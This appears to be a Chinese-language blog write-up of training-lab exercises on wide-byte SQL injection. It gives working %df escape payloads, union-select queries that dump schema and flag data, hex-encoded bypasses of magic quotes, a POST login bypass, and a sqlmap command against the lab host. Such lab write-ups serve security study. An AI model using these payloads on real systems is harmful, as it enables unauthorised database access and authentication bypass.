---
date: "2020-12-15T00:00:00Z"
description: SQL注入之 宽字节注入, 使用 sqlmap 跑结果
keywords: SQL注入, sqlmap
tags:
- SQL注入
- 安全
- sqlmap
title: SQL注入之 宽字节注入
---

# SQL注入之 宽字节注入

> http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1

利用原理： 利用**数据库** 支持的 **多字节** 编码特性， 将 **转义符号 的 `编码` ** 与**`编码`** 顺位组合， 使 **转义符号** 失去原有的意义， 从而达到逃脱的目的。

1. 这里 **多字节**  不一定是 **双字节** 如 （GBK）。 在其他字符集环境下，可能是其他字节， 例如 **UTF-8 的三字节** 。
2. 在最左侧闭合逃脱的时候，可以使用 **宽字节** 方法逃脱 ， 常用的是 **` %df\ `**， 也可以与其他字符码组合。
3. 在 sql 语句中， 如果继续使用 **%df** , 会对 sql 造成误伤（本质上会生成新的字符）， 因此在 sql 语句中，可以使用 **0x??????** 的 **16进制** 符号代替字符串。


# 宽字节注入（一）

## 测试 魔术引号

```bash
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%27%22)
```

![](https://nc0.cdn.zkaq.cn/md/8461/3c4c8f104fb3559efeca5a428b37deaa_96008.png)

通过截图发现， ` ' " ` 引号都有被**魔术引号** 转义。 但**括号** 并没有。


因此在处理这几部分的时候， 需要额外注意。


## 判断显示点

```bash
# 查询显示点
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,2,3 -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/e3dd20b1e8812d0b38bee2be1fcf19fd_15267.png)

通过结果判断， 显示点在 2 和 3 。

## 查询数据库

```bash
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,2,database() -- gg

```

![](https://nc0.cdn.zkaq.cn/md/8461/d39384d8f4fceab19cdc0e71c47d61a6_71069.png)

库名为 `wildchar`

## 查询表

```bash
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,999,(  select group_concat(table_name) from information_schema.tables where table_schema=database()  ) -- gg
```


![](https://nc0.cdn.zkaq.cn/md/8461/bb31b1fc5bdca1e11245da7f06e2505e_87045.png)


![](https://nc0.cdn.zkaq.cn/md/8461/ef819b2289c90f70c0d15b05c5fe1588_66026.png)

通过结果可以确认， 2张表，分别是

> china_flag,user

## 查询列


```bash
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,999,(  select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='china_flag' ) -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/bbe183984228d7393e8b0037c7f1545a_14904.png)

> 注意： 在查询表明的时候，同样出现了 **魔术引号** 转义 单引号。


```bash
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,999,(  select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=%df'china_flag%df' ) -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/90cfb7be300a0675559e6bfe0d91a7c3_49592.png)

如果直接使用 `%df'` 的方法， 就会在 sql 查询中出现 异常字符。导致 SQL 失败。
因此， 这里应该选择不出现 **引号，括号** 的方法。


**这里使用 16进制 绕过**   http://ctf.ssleye.com/hex.html

+ 16进制规则， `0x?????`

```
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,2,( select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6368696E615F666C6167) -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/d311c2a04ef7993aabc41e283b0cee2d_93961.png)

## 查询 FLAG

```
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,2,( select group_concat(C_Flag) from china_flag ) -- gg
```

> result : zKaQ-Wide,zKaQ-CAIK,zKaQ-Kzj+mz


# 宽字节注入（二）

```
http://inject2.lab.aqlab.cn:81/Pass-16/index.php?id=1%df%22)%20--%20gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/75ad2c7bda3ab6bcc86128da02fdda90_97691.png)

从提示可以看出， 此处使用 **双引号** 闭合， 与上题单引号类似 ， 下略。


# 宽字节注入 （三） POST

http://inject2.lab.aqlab.cn:81/Pass-17/index.php

通过提交，可以看到， 针对 **单双引号** 开启了转义。

![](https://nc0.cdn.zkaq.cn/md/8461/253ab58af2e47059e90950d54126af4f_87315.png)

同时使用 burpsuite 抓包， 看到所有符号使用了 `urlencode`

![](https://nc0.cdn.zkaq.cn/md/8461/af3e3e701faf016ed6468a5355b8667d_95320.png)

```http
POST /Pass-17/index.php HTTP/1.1
Host: inject2.lab.aqlab.cn:81
Content-Length: 54
Cache-Control: max-age=0
Origin: http://inject2.lab.aqlab.cn:81
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://inject2.lab.aqlab.cn:81/Pass-17/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7
Connection: close

username=%27%29&password=%22&submit=%E7%99%BB%E5%BD%95
```

## 逃脱转义

```http
username=&password=1%df') or 1=1 -- gg

```

![](https://nc0.cdn.zkaq.cn/md/8461/ab85ecb72ce52361e9c78738458fa2e0_55364.png)

使用 `%df'` 逃脱后， 成功登录

## 查找 flag

```http
username=&password=1%df') and 1=2 union select 1,2,3 -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/bf62da3ac10845c7d82d0fbbf07bc71c_18467.png)

使用 `union select 1,2,3`  及 `union select 1,2,3,4` 后发现， 此题包含 **盲注**。

这里使用 **布尔盲注** 测试

![](https://nc0.cdn.zkaq.cn/md/8461/fd198351fbe383dd6daa725a14f5a425_50926.png)


### 使用  burpsuite 进行探测

准备 http 文件， 并设置注入点 `username=&password=1%df')*`

> 注意

1. 这里在注入点附近加上 `%df')`， 协助 burpsuite 探测更加正确。


```http
POST /Pass-17/index.php HTTP/1.1
Host: inject2.lab.aqlab.cn:81
Content-Length: 56
Cache-Control: max-age=0
Origin: http://inject2.lab.aqlab.cn:81
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://inject2.lab.aqlab.cn:81/Pass-17/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7
Connection: close

username=&password=1%df')*
```

![](https://nc0.cdn.zkaq.cn/md/8461/d310bb8b75298382cd8c846fbabfe731_44258.png)


**当前库** 
```bash
./sqlmap.py -r 1.txt --current-db
```

> reuslt : current database: 'widechar'

**表和字段**

下略。



# 0xZZ 为什么？

为什么使用 urlcode ， 在 sql 显示正常， 但不能查询。

```bash
http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=1%df' and 1=2 union select 1,999,(  select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=%26%23%33%39%3bchina_flag%26%23%33%39%3b) -- gg
```

![](https://nc0.cdn.zkaq.cn/md/8461/a92ec5605617c4cb65c54a87dd6d1328_86121.png)




